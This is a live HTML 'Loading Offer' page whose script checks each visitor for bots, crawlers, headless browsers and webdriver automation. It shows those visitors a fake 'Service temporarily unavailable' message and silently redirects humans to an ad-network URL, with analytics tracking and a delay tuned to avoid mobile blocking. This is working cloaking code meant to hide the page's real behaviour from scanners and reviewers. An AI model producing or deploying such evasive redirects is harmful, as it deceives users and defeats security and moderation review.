<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Continue</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      padding: 20px;
      max-width: 400px;
      width: 90%;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 2rem;
      line-height: 1.3;
    }
    img {
      max-width: 100%;
      height: auto;
      border-radius: 10px;
      margin-bottom: 2rem;
      box-shadow: 0 0 15px #e50914;
    }
  </style>
  <!-- Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){ dataLayer.push(arguments); }
    gtag('js', new Date());
    gtag('config', 'G-H9VLD02NMS');
  </script>
</head>
<body>
  <div class="container">
    <h1>Loading Offer...</h1>
    <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Loading..." />
  </div>

  <script>
    // Ejecutar redirección solo después de que el contenido cargue completamente
    window.onload = function () {
      const ua = navigator.userAgent.toLowerCase();
      const isBot = /bot|crawl|spider|curl|wget|python|fetch|httpclient|java|axios|headless|phantom|scrapy/.test(ua);
      const hasWebDriver = navigator.webdriver;
      const noLang = !navigator.languages || navigator.languages.length === 0;
      const screenInvalid = screen.width === 0 || screen.height === 0;
      const isHeadless = ua.includes("headless") || ua.includes("phantom");

      if (isBot || hasWebDriver || noLang || screenInvalid || isHeadless) {
        document.body.innerHTML = "<h1>Service temporarily unavailable</h1>";
        return;
      }

      // Espera mínima y luego redirige
      setTimeout(function () {
        if (typeof gtag === "function") {
          gtag('event', 'auto_redirect', {
            event_category: 'Redirect',
            event_label: 'Auto Redirect to Offer'
          });
        }

        // Redirección final
        window.location.href = "https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02";
      }, 300); // suficiente para que móviles no lo bloqueen
    };
  </script>
</body>
</html>
